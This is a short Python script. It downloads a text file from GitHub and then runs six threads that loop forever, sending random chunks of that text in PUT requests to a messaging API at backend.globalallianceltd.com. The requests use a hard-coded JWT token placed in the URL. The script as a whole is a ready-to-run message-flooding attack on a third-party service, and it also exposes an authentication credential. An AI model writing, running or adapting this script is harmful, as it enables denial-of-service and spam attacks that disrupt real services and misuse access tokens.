import requests,json,random
import _thread
url = 'https://raw.githubusercontent.com/belka861/fx_message/main/z.txt'
r = requests.get(url, allow_redirects=True)
open('z.txt', 'wb').write(r.content)

with open('z.txt', 'r', encoding='utf-8', errors='ignore') as file:
	z = file.read().replace('\n', '')
#print(z)
rsize=len(z)
chunk=random.randint(50,200)
#print(z[5000:5020])
rstart=random.randint(100,rsize-chunk)
url='https://backend.globalallianceltd.com/api/messages/undefined?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvYmFja2VuZC5nbG9iYWxhbGxpYW5jZWx0ZC5jb21cL2FwaVwvYXV0aCIsImlhdCI6MTYyMjEzNTU4MywiZXhwIjoxNjIyMjIxOTgzLCJuYmYiOjE2MjIxMzU1ODMsImp0aSI6IkJKMjJzSFZTVzV5U1VJRlAiLCJzdWIiOjMyNTc3NiwicHJ2IjoiZTcyYTY3MDZjNTY1MDU1ZDg0MTMzYTE4OGI0MDE4MjU4MmRhMDJjNyJ9.kjxSwFUZj1UDir8MmMvcg1mAV64NDjDFrk8Jt0CypYA'
headers = {"Content-Type": "application/json"}

def worker(threadname):
	while True:
		chunk=random.randint(50,20000)
		rstart=random.randint(100,rsize-chunk)

		data={"message":z[rstart:rstart+chunk]}
		try:
			response = requests.put(url, data=json.dumps(data), headers=headers)
			res = response.json()
			print(str(threadname)+str(res))
			print (z[rstart:rstart+chunk])	
		except:
			print(str(threadname)+" req failed")
try:
	_thread.start_new_thread( worker,("thread1",) )  
	_thread.start_new_thread( worker,("thread2",) ) 
	_thread.start_new_thread( worker,("thread3",) )  
	_thread.start_new_thread( worker,("thread4",) ) 
	_thread.start_new_thread( worker,("thread5",) )  
	_thread.start_new_thread( worker,("thread6",) ) 


except:
	print ("Error: unable to start thread")

while 1:
	pass